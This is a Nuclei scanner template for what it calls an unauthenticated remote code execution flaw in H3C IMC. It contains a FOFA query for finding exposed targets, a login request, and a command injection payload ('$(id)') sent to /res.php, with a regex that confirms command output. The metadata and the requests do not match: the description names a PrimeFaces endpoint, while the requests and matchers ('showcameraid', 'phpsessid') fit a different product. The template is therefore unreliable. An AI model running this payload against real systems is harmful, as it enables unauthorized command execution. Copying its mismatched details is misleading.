id: h3c-imc-rce
info:
  author: pikpikcu
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cwe-id: CWE-77
  description: H3c IMC allows remote unauthenticated attackers to cause the remote
    web application to execute arbitrary commands via the 'dynamiccontent.properties.xhtml'
    endpoint.
  metadata:
    fofa-query: body="/imc/javax.faces.resource/images/login_help.png.jsf?ln=primefaces-imc-new-webui"
    max-request: 2
  name: H3c IMC - Remote Code Execution
  reference:
  - https://mp.weixin.qq.com/s/BP9_H3lpluqIwL5OMIJlIw
  severity: critical
  tags: rce,h3c-imc,vuln
---
http:
- extractors:
  - part: body_2
    regex:
    - uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)
    type: regex
  matchers:
  - condition: and
    dsl:
    - contains_all(to_lower(header_1), 'text/html','phpsessid','showcameraid')
    - contains(body_1, 'success')
    - status_code_1 == 200 && status_code_2 == 200
    type: dsl
  - part: body_2
    regex:
    - uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /login/dologin HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    user_name={{username}}&user_password={{password}}

    '
  - 'POST /res.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    action=node&resource=$(id)

    '
